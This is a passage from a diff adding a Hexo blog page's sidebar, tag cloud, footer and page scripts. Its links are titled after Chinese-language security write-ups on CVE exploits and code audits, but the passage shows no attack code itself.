Windows()));</span><br></pre></td></tr></table></figure>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            spaceman
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">狂雨CMS1.3.1代码审计</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/01/29/Xposed-JustTrustMe%E5%85%B3%E9%97%ADSSL%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81%E3%80%90%E6%8A%93%E5%8C%85%E3%80%91/">Xposed+JustTrustMe关闭SSL证书验证【抓包】</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/10/23/PHP%E4%B8%AD%E6%8B%BC%E6%8E%A5%E8%B0%83%E7%94%A8%E7%9A%84%E7%B1%BB/">PHP中拼接调用的类</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/04/23/CVE-2021-3493-Ubuntu%E6%8F%90%E6%9D%83/">CVE-2021-3493 Ubuntu提权</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/31/CNVD-2021-09650-%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8-EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">CNVD-2021-09650 锐捷NBR路由器 EWEB网管系统 远程命令执行</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">泛微云桥-任意文件读取</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/27/Apache-Solr-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">Apache Solr 任意文件读取漏洞</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/27/%E6%9F%90%E5%AA%92%E4%BD%93%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-by-%E6%9C%88%E7%90%83%E5%A4%A7%E5%B8%88%E5%82%85/">某媒体资源平台 权限绕过+文件上传 by 月球大师傅</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/27/CVE-2020-25540-ThinkAdmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">CVE-2020-25540 ThinkAdmin任意文件读取</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/11/%E6%B5%AA%E6%BD%AEClusterEngine4-0%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0RCE/">浪潮ClusterEngine4.0集群管理系统前台RCE</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/11/%E5%BC%B1%E5%AF%86%E7%A0%81%E4%B8%AD%E5%8F%91%E7%8E%B0%E7%9A%84%E6%8E%88%E6%9D%83%E7%BB%95%E8%BF%87/">弱密码中发现的授权绕过</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/15/CVE-2020-8949-Gocloud%E9%AB%98%E6%81%AA%E5%9B%BA%E4%BB%B6RCE/">CVE-2020-8949 Gocloud高恪固件RCE</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/18/CVE-2020-13942-Apache-Unomi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-13942 Apache Unomi 远程代码执行漏洞</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/27/CVE-2020-25540-ThinkAdmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">CVE-2020-25540 ThinkAdmin任意文件读取</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/03/27/%E6%9F%90%E5%AA%92%E4%BD%93%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-by-%E6%9C%88%E7%90%83%E5%A4%A7%E5%B8%88%E5%82%85/">某媒体资源平台 权限绕过+文件上传 by 月球大师傅</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/04/23/CVE-2021-3493-Ubuntu%E6%8F%90%E6%9D%83/">CVE-2021-3493 Ubuntu提权</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/01/29/Xposed-JustTrustMe%E5%85%B3%E9%97%ADSSL%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81%E3%80%90%E6%8A%93%E5%8C%85%E3%80%91/">Xposed+JustTrustMe关闭SSL证书验证【抓包】</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">狂雨CMS1.3.1代码审计</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/CVE/" style="font-size: 12.09861543132319px;" class="tag-cloud-link">CVE</a>
+    
+    <a href="/tags/MSF/" style="font-size: 12.830484446477307px;" class="tag-cloud-link">MSF</a>
+    
+    <a href="/tags/getshell/" style="font-size: 19.704511816521574px;" class="tag-cloud-link">getshell</a>
+    
+    <a href="/tags/%E6%9D%83%E9%99%90/" style="font-size: 10.990017362693866px;" class="tag-cloud-link">权限</a>
+    
+    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 10.725245932183164px;" class="tag-cloud-link">信息泄露</a>
+    
+    <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 8.51091584031272px;" class="tag-cloud-link">任意文件读取</a>
+    
+    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 14.041076690776851px;" class="tag-cloud-link">命令执行</a>
+    
+    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 8.324452234031803px;" class="tag-cloud-link">文件上传</a>
+    
+    <a href="/tags/CNVD/" style="font-size: 11.154966979877793px;" class="tag-cloud-link">CNVD</a>
+    
+    <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 15.698351690285866px;" class="tag-cloud-link">提权</a>
+    
+    <a href="/tags/PHP/" style="font-size: 17.27809877660902px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/%E8%B5%84%E6%BA%90/" style="font-size: 18.138433539939243px;" class="tag-cloud-link">资源</a>
+    
+    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 14.078697599695964px;" class="tag-cloud-link">代码审计</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://y4tacker.gitee.io/" target="_blank">y4tacker</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.csdn.net/weixin_47598409/" target="_blank">晚安這個未知的世界(Tony)</a>
+    </li>
+    
+    <li>
+        <a href="https://yq1ng.github.io/" target="_blank">会下雪的晴天</a>
+    </li>
+    
+    <li>
+        <a href="http://snowywar.top/" target="_blank">魔法少女雪殇</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://blog.csdn.net/WFC1006848997" target="_blank">CSDN</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2021 spaceman Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
